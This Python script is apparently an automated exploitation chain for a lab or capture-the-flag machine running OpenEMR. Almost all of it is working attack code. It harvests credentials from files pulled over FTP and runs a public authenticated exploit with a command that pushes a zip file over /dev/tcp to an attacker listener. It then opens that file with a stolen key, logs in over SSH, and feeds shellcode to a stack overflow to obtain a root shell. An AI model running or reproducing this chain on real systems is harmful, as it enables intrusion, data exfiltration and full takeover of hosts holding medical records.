#!/usr/bin/python3
import os
import time
import re
import multiprocessing
import subprocess
import shutil
import pexpect
import sys

IP = "192.168.6.165"

def GetCredentials():
	os.system(f"wget -r ftp://{IP} 2>/dev/null")

	with open(f"{IP}/share/openemr/tests/test.accounts") as f:
		credentials = f.read()

	user = re.findall("(.*):", credentials)[1]

	password = re.findall(":(.*)", credentials)[1]

	with open(f"{IP}/share/openemr/sql/keys.sql") as f:
		credentials = f.read()

	passzip = re.findall('"pdfkey", "(.*?)"', credentials)[0]

	return user, password, passzip

def MassAssignment():
	os.system("searchsploit -m php/webapps/45161.py 1>/dev/null")

	os.system(f'python2.7 45161.py -u {user} -p {password} -c "cat < /var/user.zip > /dev/tcp/192.168.6.5/1234" http://{IP}/openemr 1>/dev/null')

	os.remove("45161.py")


def GetPassZip():
	os.system("nc -lvnp 1234 > user.zip")

	subprocess.Popen(["7z", "x","user.zip",f"-p{passZip}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	time.sleep(1)

	with open("user.lst", "r") as f:
		Cred = f.read()

	Ussh = re.findall('(.*) -', Cred)[0]

	Pssh = re.findall('- (.*)', Cred)[0]

	return Ussh, Pssh


def Buff(username, password):
	ssh_command = f"ssh -o StrictHostKeyChecking=no {username}@{IP}"

	ssh_session = pexpect.spawn(ssh_command, timeout=10)

	ssh_session.sendline(password)

	ssh_session.setwinsize(43, 184)

	ssh_session.sendline("/opt/dontexecute $(python -c 'print \"\\x90\"*479 + \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\" + \"\\x30\\xd5\\xff\\xff\"')")

	ssh_session.sendline("python3 -c 'import os; os.setuid(0); os.system(\"bash\")'")

	time.sleep(1)

	ssh_session.interact()

if __name__ == "__main__":

	user, password, passZip = GetCredentials()

	shutil.rmtree(f"{IP}")

	multiprocessing.Process(target=MassAssignment).start()

	Ussh, Pssh = GetPassZip()

	os.remove("user.zip")

	os.remove("user.lst")


	Buff(Ussh, Pssh)

